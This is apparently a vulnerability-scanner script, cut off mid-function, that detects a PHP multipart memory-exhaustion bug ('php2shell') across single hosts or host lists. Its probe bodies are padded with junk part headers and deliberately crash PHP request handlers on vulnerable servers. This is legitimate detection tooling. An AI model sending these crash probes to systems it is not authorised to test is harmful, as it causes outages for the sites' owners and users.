#!/usr/bin/env python3
# /// script
# requires-python = ">=3.9"
# dependencies = []
# ///
"""php2shell scanner for CVE-2026-109618 and CVE-2026-109619."""

import argparse
import asyncio
import json
import re
import ssl
import sys
import zlib
from concurrent.futures import ThreadPoolExecutor, as_completed
from contextlib import contextmanager
from dataclasses import dataclass, field
from datetime import datetime, timezone
from functools import lru_cache
from typing import Dict, Iterator, List, Optional, Tuple
from urllib.parse import SplitResult, quote, urlsplit, urlunsplit


CVES = "CVE-2026-109618 / CVE-2026-109619"
DEFAULT_PATH = "/index.php"
PHPMYADMIN_PATH = "/show_config_errors.php"
PHPMYADMIN_MARKER = b"phpMyAdmin"
CONTROL_BOUNDARY = "x"
PROBE_BOUNDARY = "php2shell"
CONTROL_BODY = b"--x\nContent-Disposition:name=a;filename=\n\n"
JUNK_HEADER_LINE = b"x:\n"
BODY_READ_LIMIT = 1 << 20
EXCERPT_LIMIT = 2048
CONNECT_TIMEOUT = 10
MAX_RESPONSE_HEADER_BYTES = 10 << 20
UPLOAD_CHUNK_SIZE = 64 << 10
DEFAULT_USER_AGENT = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 "
    "Safari/537.36 PHP2Shell/1.0.0"
)

# Vulnerable builds keep every multipart part header in memory; measured at
# ~105 bytes of PHP memory per probe byte. Patched builds discard them.
VULNERABLE_AMPLIFICATION = 105
PROBE_SIZES_MIB = (1.5, 3.0, 7.5)
DEFAULT_MAX_PROBE_MIB = 3.0
DEFAULT_POST_MAX_SIZE_MIB = 8
REJECTED_STATUSES = {400, 403, 411, 413, 414, 417, 422, 429, 431}
FIXED_VERSIONS = {(8, 2): 35, (8, 3): 36, (8, 4): 27, (8, 5): 12}
VERSION_PATTERN = re.compile(r"PHP/(\d+)\.(\d+)\.(\d+)")
HEADER_NAME_PATTERN = re.compile(r"^[!#$%&'*+\-.^_`|~0-9A-Za-z]+$")
STATUS_LINE_PATTERN = re.compile(rb"HTTP/1\.[01] ([0-9]{3})(?: (.*))?")
CHUNK_SIZE_PATTERN = re.compile(rb"[0-9A-Fa-f]+")
SENSITIVE_HEADERS = {
    "authorization",
    "cookie",
    "proxy-authorization",
    "set-cookie",
    "x-api-key",
}


class Colors:
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    CYAN = "\033[96m"
    WHITE = "\033[97m"
    BOLD = "\033[1m"
    RESET = "\033[0m"


@dataclass
class HTTPResult:
    status_code: Optional[int] = None
    reason: str = ""
    headers: Dict[str, str] = field(default_factory=dict)
    body: bytes = b""
    bytes_sent: int = 0
    error: Optional[str] = None

    @property
    def powered_by(self) -> str:
        for name, value in self.headers.items():
            if name.lower() == "x-powered-by":
                return value
        return ""


def colorize(text: str, color: str) -> str:
    return f"{color}{text}{Colors.RESET}"


class ProgressBar:
    """Single-line scan progress drawn on stderr when it is a terminal."""

    WIDTH = 40

    def __init__(self, total: int, disable: bool = False) -> None:
        self.total = total
        self.done = 0
        self.enabled = not disable and sys.stderr.isatty()

    def __enter__(self) -> "ProgressBar":
        self.draw()
        return self

    def __exit__(self, *exc_info) -> None:
        if self.enabled:
            sys.stderr.write("\n")
            sys.stderr.flush()

    def draw(self) -> None:
        if not self.enabled:
            return
        filled = self.WIDTH * self.done // self.total if self.total else self.WIDTH
        bar = "#" * filled + "-" * (self.WIDTH - filled)
        sys.stderr.write(
            f"\r\033[K{colorize('Scanning', Colors.CYAN)}: [{bar}] "
            f"{self.done}/{self.total} hosts"
        )
        sys.stderr.flush()

    def update(self) -> None:
        self.done += 1
        self.draw()

    @contextmanager
    def suspended(self) -> Iterator[None]:
        if self.enabled:
            sys.stderr.write("\r\033[K")
            sys.stderr.flush()
        try:
            yield
        finally:
            sys.stdout.flush()
            self.draw()


def print_banner() -> None:
    print(f"\n{Colors.CYAN}{Colors.BOLD}brought to you by assetnote{Colors.RESET}\n")


def utc_now() -> str:
    return datetime.now(timezone.utc).isoformat().replace("+00:00", "Z")


def parse_headers(header_list: Optional[List[str]]) -> Dict[str, str]:
    headers: Dict[str, str] = {}
    for header in header_list or []:
        if ":" not in header:
            raise ValueError(f"invalid header {header!r}; expected 'Key: Value'")
        key, value = header.split(":", 1)
        key = key.strip()
        if not key:
            raise ValueError(f"invalid header {header!r}; header name is empty")
        value = value.lstrip()
        if not HEADER_NAME_PATTERN.fullmatch(key):
            raise ValueError(f"invalid header name {key!r}")
        if "\r" in value or "\n" in value:
            raise ValueError(f"invalid value for header {key!r}")
        try:
            key.encode("ascii")
            value.encode("latin-1")
        except UnicodeEncodeError as exc:
            raise ValueError(f"header {key!r} cannot be encoded as HTTP/1.1") from exc
        headers[key] = value
    return headers


def has_header(headers: Dict[str, str], name: str) -> bool:
    return any(key.lower() == name.lower() for key in headers)


def set_header(headers: Dict[str, str], name: str, value: str) -> None:
    for key in list(headers):
        if key.lower() == name.lower():
            del headers[key]
    headers[name] = value


def normalize_url(raw_url: str) -> str:
    raw_url = raw_url.strip()
    if not raw_url:
        raise ValueError("invalid or empty URL")
    if "://" not in raw_url:
        raw_url = "https://" + raw_url

    parsed = urlsplit(raw_url)
    if parsed.scheme not in ("http", "https") or not parsed.netloc:
        raise ValueError("invalid HTTP URL")
    if parsed.username is not None or parsed.password is not None:
        raise ValueError(
            "credentials in URLs are not supported; use an Authorization header"
        )

    path = parsed.path
    if not path or path == "/":
        path = DEFAULT_PATH
    return urlunsplit((parsed.scheme, parsed.netloc, path, "", ""))


def safe_url_label(raw_url: str) -> str:
    value = raw_url.strip()
    if not value:
        return "<empty URL>"
    candidate = value if "://" in value else "https://" + value
    try:
        parsed = urlsplit(candidate)
    except ValueError:
        return "<invalid URL>"
    if not parsed.netloc:
        return "<invalid URL>"
    netloc = parsed.netloc.rsplit("@", 1)[-1]
    return urlunsplit((parsed.scheme, netloc, parsed.path, "", ""))


def replace_path(target_url: str, path_value: str) -> str:
    parsed = urlsplit(target_url)
    custom = urlsplit(path_value if path_value.startswith("/") else "/" + path_value)
    path = custom.path or DEFAULT_PATH
    return urlunsplit((parsed.scheme, parsed.netloc, path, "", ""))


def phpmyadmin_target(target_url: str) -> str:
    parsed = urlsplit(target_url)
    return urlunsplit((parsed.scheme, parsed.netloc, PHPMYADMIN_PATH, "", ""))


def probe_sizes(max_probe_mib: float) -> Tuple[float, ...]:
    return tuple(size for size in PROBE_SIZES_MIB if size < max_probe_mib) + (
        max_probe_mib,
    )


def format_mib(size_mib: float) -> str:
    return f"{size_mib:g} MiB"


def junk_lines(size_mib: float) -> bytes:
    return JUNK_HEADER_LINE * (int(size_mib * (1 << 20)) // len(JUNK_HEADER_LINE))


@lru_cache(maxsize=None)
def build_probe_body(size_mib: float) -> bytes:
    """One form field whose part header block is padded with junk headers."""
    boundary = PROBE_BOUNDARY.encode("ascii")
    return (
        b"--" + boundary + b"\r\n"
        b'Content-Disposition: form-data; name="p"\r\n'
        + junk_lines(size_mib)
        + b"\r\nv\r\n--" + boundary + b"--\r\n"
    )


@lru_cache(maxsize=None)
def build_baseline_body(size_mib: float) -> bytes:
    """Same-size upload carrying the padding as file content, streamed to disk."""
    boundary = PROBE_BOUNDARY.encode("ascii")
    return (
        b"--" + boundary + b"\r\n"
        b'Content-Disposition: form-data; name="p"; filename="p.txt"\r\n\r\n'
        + junk_lines(size_mib)
        + b"\r\n--" + boundary + b"--\r\n"
    )


def request_headers(custom_headers: Dict[str, str], boundary: str) -> Dict[str, str]:
    headers = dict(custom_headers)
    for name in ("Content-Length", "Transfer-Encoding"):
        for key in list(headers):
            if key.lower() == name.lower():
                del headers[key]
    if not has_header(headers, "User-Agent"):
        headers["User-Agent"] = DEFAULT_USER_AGENT
    set_header(headers, "Content-Type", f"multipart/form-data; boundary={boundary}")
    set_header(headers, "Connection", "close")
    if not has_header(headers, "Accept-Encoding"):
        headers["Accept-Encoding"] = "gzip"
    return headers


class HTTPTransportError(Exception):
    """Raised for a well-formed HTTP exchange that cannot be completed."""


def header_value(headers: Dict[str, str], name: str) -> str:
    for key, value in headers.items():
        if key.lower() == name.lower():
            return value
    return ""


def remove_header(headers: Dict[str, str], name: str) -> None:
    for key in list(headers):
        if key.lower() == name.lower():
            del headers[key]


def request_target(parsed: SplitResult) -> bytes:
    path = quote(
        parsed.path or "/",
        safe="/%:@!$&'()*+,;=-._~",
        encoding="utf-8",
        errors="strict",
    )
    if parsed.query:
        path += "?" + quote(
            parsed.query,
            safe="/?%:@!$&'()*+,;=-._~",
            encoding="utf-8",
            errors="strict",
        )
    return path.encode("ascii")


def host_header(parsed: SplitResult) -> str:
    hostname = parsed.hostname
    if hostname is None:
        raise ValueError("target URL does not contain a hostname")
    hostname = hostname.encode("idna").decode("ascii")
    if ":" in hostname:
        hostname = f"[{hostname}]"
    if parsed.port is not None:
        hostname += f":{parsed.port}"
    return hostname


def wire_headers(
    parsed: SplitResult, headers: Dict[str, str], body_size: int
) -> List[Tuple[bytes, bytes]]:
    supplied_host = header_value(headers, "Host")
    host = supplied_host or host_header(parsed)
    encoded: List[Tuple[bytes, bytes]] = [(b"Host", host.encode("latin-1"))]
    for name, value in headers.items():
        if name.lower() == "host":
            continue
        encoded.append((name.encode("ascii"), value.encode("latin-1")))
    encoded.append((b"Content-Length", str(body_size).encode("ascii")))
    for name, value in encoded:
        if re.search(rb"[\r\n\x00]", value):
            raise ValueError(f"invalid value for header {name.decode('ascii')!r}")
    return encoded


def request_head(
    parsed: SplitResult, headers: Dict[str, str], body_size: int
) -> bytes:
    lines = [b"POST " + request_target(parsed) + b" HTTP/1.1"]
    lines.extend(
        name + b": " + value for name, value in wire_headers(parsed, headers, body_size)
    )
    return b"\r\n".join(lines) + b"\r\n\r\n"


def response_headers(raw_headers: List[Tuple[bytes, bytes]]) -> Dict[str, str]:
    headers: Dict[str, str] = {}
    original_names: Dict[str, str] = {}
    for raw_name, raw_value in raw_headers:
        name = raw_name.decode("ascii")
        value = raw_value.decode("latin-1")
        lowered = name.lower()
        if lowered in original_names:
            original = original_names[lowered]
            headers[original] += ", " + value
        else:
            original_names[lowered] = name
            headers[name] = value
    return headers


async def upload_body(writer: asyncio.StreamWriter, body: bytes) -> None:
    for offset in range(0, len(body), UPLOAD_CHUNK_SIZE):
        writer.write(body[offset : offset + UPLOAD_CHUNK_SIZE])
        await writer.drain()


class ResponseReader:
    """Adapts asyncio.StreamReader to the line/chunk reads used for parsing."""

    def __init__(self, reader: asyncio.StreamReader) -> None:
        self.reader = reader

    async def read_line(self) -> bytes:
        try:
            line = await self.reader.readline()
        except (ValueError, asyncio.LimitOverrunError) as exc:
            raise HTTPTransportError("response line exceeds the size limit") from exc
        if not line.endswith(b"\n"):
            raise HTTPTransportError("connection closed before the response completed")
        return line.rstrip(b"\r\n")

    async def read_some(self, limit: int) -> bytes:
        return await self.reader.read(limit)


async def read_response_head(
    reader: ResponseReader,
) -> Tuple[int, str, List[Tuple[bytes, bytes]]]:
    status_line = await reader.read_line()
    match = STATUS_LINE_PATTERN.fullmatch(status_line)
    if not match:
        raise HTTPTransportError(f"malformed status line: {status_line[:80]!r}")

    raw_headers: List[Tuple[bytes, bytes]] = []
    head_size = len(status_line)
    while True:
        line = await reader.read_line()
        if not line:
            break
        head_size += len(line)
        if head_size > MAX_RESPONSE_HEADER_BYTES:
            raise HTTPTransportError("response headers exceed the size limit")
        if line[:1] in (b" ", b"\t") and raw_headers:
            name, value = raw_headers[-1]
            raw_headers[-1] = (name, value + b" " + line.strip(b" \t"))
            continue
        name, separator, value = line.partition(b":")
        if not separator or not HEADER_NAME_PATTERN.fullmatch(name.decode("latin-1")):
            raise HTTPTransportError(f"malformed response header: {line[:80]!r}")
        raw_headers.append((name.lower(), value.strip(b" \t")))

    reason = (match.group(2) or b"").decode("latin-1")
    return int(match.group(1)), reason, raw_headers


def parse_content_length(value: str) -> int:
    values = {item.strip() for item in value.split(",")}
    length = values.pop() if len(values) == 1 else ""
    if not length.isdigit():
        raise HTTPTransportError(f"invalid Content-Length: {value}")
    return int(length)


async def read_fixed_body(reader, length, consume) -> None:
    while length:
        data = await reader.read_some(min(length, UPLOAD_CHUNK_SIZE))
        if not data:
            raise HTTPTransportError("connection closed before the response completed")
        length -= len(data)
        consume(data)


async def read_chunked_body(reader, consume) -> None:
    while True:
        size_text = (await reader.read_line()).split(b";", 1)[0].strip()
        if not CHUNK_SIZE_PATTERN.fullmatch(size_text):
            raise HTTPTransportError(f"invalid chunk size: {size_text[:20]!r}")
        size = int(size_text, 16)
        if size == 0:
            break
        await read_fixed_body(reader, size, consume)
        if await reader.read_line():
            raise HTTPTransportError("missing CRLF after response chunk")
    while await reader.read_line():
        pass


async def read_response(reader: ResponseReader) -> HTTPResult:
    while True:
        status_code, reason, raw_headers = await read_response_head(reader)
        if status_code == 101:
            raise HTTPTransportError("HTTP protocol upgrades are not supported")
        if status_code >= 200:
            break

    headers = response_headers(raw_headers)
    encoding = header_value(headers, "Content-Encoding").strip().lower()
    transfer = header_value(headers, "Transfer-Encoding").strip().lower()
    length = header_value(headers, "Content-Length").strip()
    body = bytearray()
    decoder = None
    if encoding == "gzip":
        decoder = zlib.decompressobj(16 + zlib.MAX_WBITS)
        remove_header(headers, "Content-Encoding")
        remove_header(headers, "Content-Length")
    elif encoding not in ("", "identity"):
        raise HTTPTransportError(f"unsupported content encoding: {encoding}")

    def consume(data: bytes) -> None:
        room = BODY_READ_LIMIT - len(body)
        if room <= 0:
            return
        if decoder is not None:
            try:
                data = decoder.decompress(data, room)
            except zlib.error as exc:
                raise HTTPTransportError(f"invalid gzip response: {exc}") from exc
        body.extend(data[:room])

    if status_code in (204, 304):
        pass
    elif transfer:
        if transfer != "chunked":
            raise HTTPTransportError(f"unsupported transfer encoding: {transfer}")
        await read_chunked_body(reader, consume)
    elif length:
        await read_fixed_body(reader, parse_content_length(length), consume)
    else:
        while True:
            data = await reader.read_some(UPLOAD_CHUNK_SIZE)
            if not data:
                break
            consume(data)

    if decoder is not None:
        try:
            body.extend(decoder.flush()[: BODY_READ_LIMIT - len(body)])
        except zlib.error as exc:
            raise HTTPTransportError(f"invalid gzip response: {exc}") from exc
    return HTTPResult(status_code, reason, headers, bytes(body))



async def exchange_post(
    target_url: str,
    body: bytes,
    headers: Dict[str, str],
    timeout: int,
    verify_ssl: bool,
) -> HTTPResult:
    parsed = urlsplit(target_url)
    hostname = parsed.hostname
    if hostname is None:
        raise ValueError("target URL does not contain a hostname")
    port = parsed.port or (443 if parsed.scheme == "https" else 80)

    open_kwargs = {"happy_eyeballs_delay": 0.25}
    if parsed.scheme == "https":
        context = ssl.create_default_context()
        context.set_alpn_protocols(["http/1.1"])
        if not verify_ssl:
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
        open_kwargs.update(
            ssl=context,
            server_hostname=hostname,
            ssl_handshake_timeout=min(CONNECT_TIMEOUT, timeout),
        )

    reader, writer = await asyncio.wait_for(
        asyncio.open_connection(
            hostname, port, limit=MAX_RESPONSE_HEADER_BYTES, **open_kwargs
        ),
        timeout=min(CONNECT_TIMEOUT, timeout),
    )
    upload_task: Optional[asyncio.Task] = None
    try:
        writer.write(request_head(parsed, headers, len(body)))
        await writer.drain()
        upload_task = asyncio.create_task(upload_body(writer, body))
        return await read_response(ResponseReader(reader))
    finally:
        if upload_task is not None:
            if not upload_task.done():
                upload_task.cancel()
            await asyncio.gather(upload_task, return_exceptions=True)
        try:
            writer.transport.abort()
        except Exception:
            pass


async def timed_exchange_post(
    target_url: str,
    body: bytes,
    headers: Dict[str, str],
    timeout: int,
    verify_ssl: bool,
) -> HTTPResult:
    return await asyncio.wait_for(
        exchange_post(target_url, body, headers, timeout, verify_ssl),
        timeout=timeout,
    )


def send_post(
    target_url: str,
    body: bytes,
    boundary: str,
    custom_headers: Dict[str, str],
    timeout: int,
    verify_ssl: bool,
) -> HTTPResult:
    result = HTTPResult(bytes_sent=len(body))
    headers = request_headers(custom_headers, boundary)
    try:
        response = asyncio.run(
            timed_exchange_post(target_url, body, headers, timeout, verify_ssl)
        )
        result.status_code = response.status_code
        result.reason = response.reason
        result.headers = response.headers
        result.body = response.body
    except ssl.SSLError as exc:
        result.error = f"SSL error: {exc}"
    except asyncio.TimeoutError:
        result.error = "request timed out"
    except (ValueError, UnicodeError) as exc:
        result.error = f"request failed: {exc}"
    except HTTPTransportError as exc:
        result.error = f"response read failed: {exc}"
    except OSError as exc:
        result.error = f"connection error: {exc}"
    return result


def version_verdict(powered_by: str) -> Optional[str]:
    match = VERSION_PATTERN.search(powered_by)
    if not match:
        return None
    major, minor, patch = (int(value) for value in match.groups())
    fixed_patch = FIXED_VERSIONS.get((major, minor))
    if fixed_patch is None:
        return None
    return "FIXED" if patch >= fixed_patch else "VULNERABLE"


def crash_signal(
    control: HTTPResult, probe: HTTPResult, sapi: str
) -> Tuple[Optional[str], Optional[str]]:
    both = "PHP-FPM" if sapi == "fpm" else "mod_php" if sapi == "mod_php" else "mod_php/PHP-FPM"
    empty_body = bool(control.body) and not probe.body

    if (
        b"Allowed memory size of " in probe.body
        and b" bytes exhausted" in probe.body
        and b"Unknown" in probe.body
    ):
        return both, (
            "in-band PHP fatal error (memory exhausted in Unknown) raised while "
            "parsing the multipart body"
        )
    if probe.status_code == 500 and empty_body:
        return both, "HTTP 500 with an empty body although the control request produced output"

    if sapi == "mod_php":
        return None, None
    if probe.status_code in (502, 503, 504):
        return "PHP-FPM", (
            f"HTTP {probe.status_code} from the web server fronting PHP-FPM "
            "(worker died mid-request)"
        )
    if probe.status_code == 200 and empty_body:
        return "PHP-FPM", (
            "HTTP 200 with an empty body although the control request produced "
            "output (worker died mid-request)"
        )
    return None, None


def describe_response(response: HTTPResult) -> str:
    if response.error:
        return (
            f"request failed after sending {response.bytes_sent} bytes: "
            f"{response.error}"
        )
    return (
        f"HTTP {response.status_code}, {len(response.body)} byte response "
        f"(sent {response.bytes_sent} bytes)"
    )


def response_dump(response: HTTPResult) -> Optional[str]:
    if response.status_code is None:
        return None
    lines = [f"HTTP/1.1 {response.status_code} {response.reason}".rstrip()]
    lines.extend(
        f"{name}: {redact_header(name, value)}"
        for name, value in response.headers.items()
    )
    excerpt = response.body[:EXCERPT_LIMIT].decode("utf-8", errors="replace")
    return "\r\n".join(lines) + "\r\n\r\n" + excerpt


def request_dump(
    target_url: str,
    headers: Dict[str, str],
    body_size: int,
    description: str,
) -> str:
    parsed: SplitResult = urlsplit(target_url)
    request_target = parsed.path or "/"
    if parsed.query:
        request_target += "?" + parsed.query
    lines = [f"POST {request_target} HTTP/1.1", f"Host: {parsed.netloc}"]
    lines.extend(
        f"{name}: {redact_header(name, value)}" for name, value in headers.items()
    )
    lines.append(f"Content-Length: {body_size}")
    return "\r\n".join(lines) + f"\r\n\r\n<{description}; {body_size} bytes>"


def redact_header(name: str, value: str) -> str:
    return "<redacted>" if name.lower() in SENSITIVE_HEADERS else value


def terminal_safe(value: str) -> str:
    return "".join(
        character
        if character >= " " and character != "\x7f"
        else f"\\x{ord(character):02x}"
        for character in value
    )


def base_result(host: str) -> dict:
    result = dict.fromkeys((
        "status_code", "error", "reason", "sapi", "powered_by", "request",
        "response", "final_url", "tested_url", "control", "baseline",
        "service_recovered",
    ))
    result.update(host=host, vulnerable=None, verdict="ERROR", probes=[],
                  timestamp=utc_now())
    return result


def apply_response(result: dict, response: HTTPResult) -> None:
    result["status_code"] = response.status_code
    result["response"] = response_dump(response)


def response_metadata(response: HTTPResult) -> dict:
    return {
        "status_code": response.status_code,
        "response_bytes": len(response.body),
        "bytes_sent": response.bytes_sent,
        "error": response.error,
        "description": describe_response(response),
    }


def check_url(
    host: str,
    target_url: str,
    timeout: int,
    verify_ssl: bool,
    custom_headers: Dict[str, str],
    sapi: str,
    sizes: Tuple[float, ...] = probe_sizes(DEFAULT_MAX_PROBE_MIB),
) -> dict:
    result = base_result(host)
    result["tested_url"] = target_url
    result["final_url"] = target_url

    def post(url, body, boundary):
        return send_post(url, body, boundary, custom_headers, timeout, verify_ssl)

    def run_control(url, label):
        """Send the control request, record it, and return (control, early)."""
        control = post(url, CONTROL_BODY, CONTROL_BOUNDARY)
        result["request"] = request_dump(
            url,
            request_headers(custom_headers, CONTROL_BOUNDARY),
            len(CONTROL_BODY),
            "minimal multipart control body",
        )
        apply_response(result, control)
        result["control"] = response_metadata(control)
        if control.error:
            result["error"] = f"{label} request failed: {control.error}"
        elif control.status_code is not None and control.status_code >= 500:
            result["verdict"] = "INCONCLUSIVE"
            result["error"] = f"{label} request returned HTTP {control.status_code}"
        else:
            return control, False
        result["reason"] = result["error"]
        return control, True

    control, early = run_control(target_url, "control")
    if early:
        return result

    if PHPMYADMIN_MARKER in control.body:
        target_url = phpmyadmin_target(target_url)
        result["final_url"] = target_url
        control, early = run_control(target_url, "phpMyAdmin control")
        if early:
            return result

    powered_by = control.powered_by
    rejected_reason = None
    covered_mib = 0.0

    def done(verd, reason, vulnerable=None, sapi=None, error=None):
        result.update(verdict=verd, reason=reason)
        if vulnerable is not None:
            result["vulnerable"] = vulnerable
        if sapi:
            result["sapi"] = sapi
        if error is not None:
            result["error"] = error
        return result

    for index, size_mib in enumerate(sizes, start=1):
        size_label = format_mib(size_mib)
        body = build_probe_body(size_mib)
        probe = post(target_url, body, PROBE_BOUNDARY)
        meta = response_metadata(probe)
        meta.update(probe=index, size_mib=size_mib)
        result["probes"].append(meta)
        result["request"] = request_dump(
            target_url,
            request_headers(custom_headers, PROBE_BOUNDARY),
            len(body),
            f"php2shell probe {index}: {size_label} of junk multipart part headers",
        )
        apply_response(result, probe)
        if probe.powered_by:
            powered_by = probe.powered_by
        result["powered_by"] = powered_by or None

        if probe.error:
            msg = f"probe {index} failed before a response was read: {probe.error}"
            return done("INCONCLUSIVE", msg, error=msg)

        if probe.status_code in REJECTED_STATUSES:
            rejected_reason = (
                f"probe {index} was rejected with HTTP {probe.status_code} "
                "before PHP parsed it"
            )
            break

        detected_sapi, signal = crash_signal(control, probe, sapi)
        if not signal:
            covered_mib = size_mib * VULNERABLE_AMPLIFICATION
            if version_verdict(powered_by) == "FIXED":
                return done(
                    "FIXED",
                    "no crash observed and X-Powered-By reports a patched release: "
                    + powered_by,
                    vulnerable=False,
                )
            continue

        # Patched builds discard the junk headers, so a same-size upload that
        # PHP streams to disk must succeed for the failure to count.
        baseline = post(target_url, build_baseline_body(size_mib), PROBE_BOUNDARY)
        result["baseline"] = response_metadata(baseline)
        result["baseline"]["size_mib"] = size_mib
        _, baseline_signal = crash_signal(control, baseline, sapi)
        if (
            baseline.error is not None
            or baseline.status_code is None
            or baseline.status_code >= 500
            or baseline.status_code in REJECTED_STATUSES
            or baseline_signal is not None
        ):
            health = post(target_url, CONTROL_BODY, CONTROL_BOUNDARY)
            recovered = health.error is None and (health.status_code or 500) < 500
            result["service_recovered"] = recovered
            msg = (
                f"probe {index} ({size_label}) failed ({signal}), but a same-size "
                f"file upload also failed ({describe_response(baseline)}), so the "
                "failure cannot be attributed to php2shell"
            )
            if not recovered:
                msg += (
                    "; WARNING: the target did not answer a normal request "
                    f"afterwards ({describe_response(health)})"
                )
            return done("INCONCLUSIVE", msg, error=msg)

        result["service_recovered"] = True
        return done(
            "VULNERABLE",
            f"probe {index} ({size_label} of part headers) crashed the request "
            f"handler: {signal}; a same-size file upload succeeded",
            vulnerable=True,
            sapi=detected_sapi,
        )

    result["powered_by"] = powered_by or None
    by_version = version_verdict(powered_by)
    if by_version == "VULNERABLE":
        sapi_name = "unknown" if sapi == "auto" else "PHP-FPM" if sapi == "fpm" else "mod_php"
        return done(
            "VULNERABLE",
            "no crash observed; X-Powered-By reports an unpatched release: "
            + powered_by + " (verify distro backports)",
            vulnerable=True,
            sapi=sapi_name,
        )
    if by_version == "FIXED":
        return done(
            "FIXED",
            "no crash observed and X-Powered-By reports a patched release: " + powered_by,
            vulnerable=False,
        )
    if rejected_reason:
        return done("INCONCLUSIVE", rejected_reason, error=rejected_reason)
    return done(
        "NO SIGNAL",
        "no crash observed and no PHP version advertised; the probes only "
        f"detect a memory_limit up to ~{covered_mib:.0f} MiB",
        vulnerable=False,
    )


def check_vulnerability(
    host: str,
    timeout: int = 60,
    verify_ssl: bool = True,
    custom_headers: Optional[Dict[str, str]] = None,
    sapi: str = "auto",
    paths: Optional[List[str]] = None,
    sizes: Tuple[float, ...] = probe_sizes(DEFAULT_MAX_PROBE_MIB),
) -> dict:
    display_host = safe_url_label(host)
    try:
        normalized = normalize_url(host)
    except ValueError as exc:
        result = base_result(display_host)
        result["error"] = str(exc)
        result["reason"] = str(exc)
        return result

    targets = (
        [replace_path(normalized, path) for path in paths] if paths else [normalized]
    )
    fallback: Optional[dict] = None
    fallback_priority = {"NO SIGNAL": 0, "FIXED": 1, "INCONCLUSIVE": 2, "ERROR": 2}
    for target_url in targets:
        result = check_url(
            normalized,
            target_url,
            timeout,
            verify_ssl,
            custom_headers or {},
            sapi,
            sizes,
        )
        if result["vulnerable"] is True:
            return result
        if fallback is None or fallback_priority.get(
            result["verdict"], 0
        ) > fallback_priority.get(fallback["verdict"], 0):
            fallback = result
    return fallback or base_result(normalized)


def load_lines(path: str, label: str) -> List[str]:
    values: List[str] = []
    try:
        with open(path, "r", encoding="utf-8") as handle:
            for line in handle:
                value = line.strip()
                if value and not value.startswith("#"):
                    values.append(value)
    except OSError as exc:
        print(colorize(f"[ERROR] Failed to read {label} file: {exc}", Colors.RED))
        sys.exit(1)
    return values


def deduplicate_hosts(hosts: List[str]) -> List[str]:
    deduplicated = []
    seen = set()
    for host in hosts:
        try:
            parsed = urlsplit(normalize_url(host))
            key = (
                parsed.scheme.lower(),
                parsed.netloc.lower(),
                parsed.path,
            )
        except ValueError:
            key = (safe_url_label(host),)
        if key not in seen:
            seen.add(key)
            deduplicated.append(host)
    return deduplicated


def save_results(
    results: List[dict],
    output_file: str,
    vulnerable_only: bool = True,
    announce: bool = True,
) -> bool:
    selected = (
        [result for result in results if result.get("vulnerable") is True]
        if vulnerable_only
        else results
    )
    output = {
        "scan_time": utc_now(),
        "total_results": len(selected),
        "results": selected,
    }
    try:
        with open(output_file, "w", encoding="utf-8") as handle:
            json.dump(output, handle, indent=2)
        if announce:
            print(colorize(f"\n[+] Results saved to: {output_file}", Colors.GREEN))
        return True
    except OSError as exc:
        print(colorize(f"\n[ERROR] Failed to save results: {exc}", Colors.RED))
        return False


def print_result(result: dict, verbose: bool = False) -> None:
    host = result["host"]
    verdict = result["verdict"]
    if result["vulnerable"] is True:
        status = colorize("[VULNERABLE]", Colors.RED + Colors.BOLD)
    elif result["vulnerable"] is False:
        status = colorize("[NOT VULNERABLE]", Colors.GREEN)
    elif verdict == "INCONCLUSIVE":
        status = colorize("[INCONCLUSIVE]", Colors.YELLOW)
    else:
        status = colorize("[ERROR]", Colors.YELLOW)

    details = []
    if result.get("status_code") is not None:
        details.append(f"Status: {result['status_code']}")
    if result.get("sapi"):
        details.append(f"SAPI: {result['sapi']}")
    if verdict:
        details.append(f"Verdict: {verdict}")
    suffix = " - " + " - ".join(details) if details else ""
    print(f"{status} {colorize(terminal_safe(host), Colors.WHITE)}{suffix}")

    if result.get("final_url") and result.get("final_url") != result.get("tested_url"):
        print(f"  -> Retargeted to: {terminal_safe(result['final_url'])}")
    if verbose and result.get("reason"):
        print(f"  -> {terminal_safe(result['reason'])}")
    if verbose and result.get("response"):
        print(colorize("  Response snippet:", Colors.CYAN))
        for line in result["response"].split("\r\n")[:10]:
            print(f"    {terminal_safe(line)}")


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="php2shell Scanner",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s -u https://example.com
  %(prog)s -l hosts.txt -t 20 -o results.json
  %(prog)s -u https://example.com -H "Authorization: Bearer token"
  %(prog)s -u https://example.com --path /phpinfo.php
  %(prog)s -l hosts.txt --sapi fpm --timeout 90
        """,
    )
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-u", "--url", help="Single URL/host to check")
    group.add_argument("-l", "--list", help="File containing hosts (one per line)")
    add = parser.add_argument
    add("-t", "--threads", type=int, default=10, help="Concurrent threads (default: 10)")
    add("--timeout", type=int, default=60, help="Request timeout, seconds (default: 60)")
    add("-o", "--output", help="Output file for results (JSON)")
    add("--all-results", action="store_true", help="Save all results, not only vulnerable")
    add("-k", "--insecure", action="store_true", help="Disable TLS certificate verification")
    add("-H", "--header", action="append", dest="headers", metavar="HEADER",
        help="Custom header in 'Key: Value' format; repeatable")
    add("-v", "--verbose", action="store_true", help="Show verdict reasons and snippets")
    add("-q", "--quiet", action="store_true", help="Only print vulnerable hosts")
    add("--no-color", action="store_true", help="Disable colored output")
    add("--sapi", choices=("auto", "mod_php", "fpm"), default="auto",
        help="Verdict rules to use (default: auto)")
    add("--max-probe-mib", type=float, default=DEFAULT_MAX_PROBE_MIB,
        help="Largest probe in MiB (default: %(default)g). A vulnerable build uses "
        f"~{VULNERABLE_AMPLIFICATION}x the probe size in memory, so this bounds both "
        "the memory_limit that can be detected and the load placed on a vulnerable host")
    add("--path", action="append", dest="paths", help="Custom path to test; repeatable")
    add("--path-file", help="File containing paths to test (one per line)")
    return parser


def main() -> None:
    args = build_parser().parse_args()
    for value, name in ((args.threads, "--threads"), (args.timeout, "--timeout")):
        if value < 1:
            raise SystemExit(f"{name} must be at least 1")
    if args.max_probe_mib <= 0:
        raise SystemExit("--max-probe-mib must be positive")
    sizes = probe_sizes(args.max_probe_mib)
    peak_mib = args.max_probe_mib * VULNERABLE_AMPLIFICATION

    if args.no_color or not sys.stdout.isatty():
